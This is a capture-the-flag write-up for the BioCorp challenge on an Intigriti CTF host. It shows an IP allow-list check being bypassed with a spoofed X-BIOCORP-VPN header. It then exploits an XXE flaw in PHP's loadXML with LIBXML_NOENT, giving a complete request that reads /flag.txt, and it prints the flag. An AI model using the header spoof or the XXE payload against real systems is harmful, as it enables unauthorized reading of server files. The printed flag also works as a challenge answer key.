While analyzing the files I find **panel.php**:

```php
if ($ip_address !== '80.187.61.102') {

    echo "<h1>Access Denied</h1>";
    echo "<p>You do not have permission to access this page.</p>";
    exit;

}
```

So, to access `panel.php` I need to spoof the IP `80.187.61.102` by including the header:

```
X-BIOCORP-VPN: 80.187.61.102
```

Analyzing the code further, I realize that the panel is also vulnerable to an **XXE attack**:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {

    $xml_data = file_get_contents('php://input');
    $doc = new DOMDocument();

    if (!$doc->loadXML($xml_data, LIBXML_NOENT)) {
        echo "<h1>Invalid XML</h1>";
        exit;
    }

} else {
    $xml_data = file_get_contents('data/reactor_data.xml');
    $doc = new DOMDocument();
    $doc->loadXML($xml_data, LIBXML_NOENT);
}

$temperature = $doc->getElementsByTagName('temperature')->item(0)->nodeValue ?? 'Unknown';
$pressure = $doc->getElementsByTagName('pressure')->item(0)->nodeValue ?? 'Unknown';
$control_rods = $doc->getElementsByTagName('control_rods')->item(0)->nodeValue ?? 'Unknown';
```

With **BurpSuite** I craft a request to extract `flag.txt`:

```
POST /panel.php HTTP/2
Host: biocorp.ctf.intigriti.io
X-Biocorp-Vpn: 80.187.61.102
Content-Type: application/xml
Content-Length: 123

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<temperature>&xxe;</temperature>
```

And here is the flag:

```
INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}
```